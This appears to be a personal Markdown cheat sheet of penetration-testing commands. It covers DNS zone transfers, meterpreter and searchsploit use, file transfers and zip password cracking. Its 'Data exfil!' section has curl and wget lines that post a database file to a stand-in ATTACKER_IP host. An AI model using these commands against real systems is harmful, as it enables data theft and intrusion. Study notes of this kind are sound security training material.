# Log into git on machine

```bash
git config --global user.name "Julian Johnson"
```

```bash
git config --global user.email "julian.johnson.10@outlook.com"
```

## Perform zone transfer (only works over port 53/tcp)

```bash
dig axfr @$ip $domain 2>&1 | tee "tcp_53_dns_dig.txt"
```

```bash
dig @192.0.2.1 example.com axfr
```

## Metasploit/Searchsploit Commands

### Run from meterpreter shell to run shell commands
```bash
shell
```

Print the path of an exploit
```
searchsploit -p <exploit-id>
```


**Data exfil!**
`curl -X POST --data-binary @/path/to/file.db http://ATTACKER_IP:8000`

`wget --method=POST --body-file=/path/to/file.db http://ATTACKER_IP:8000`

`impacket-smbserver share . -smb2support`

SCP:

Remote to local:

`scp -P2222 student@192.168.237.52:/home/student/navigating-code.exe .`

Local to remote:

`scp bolt.db kali@192.168.1.100:/home/kali/`

**Crack Zip Folders**
`fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip`

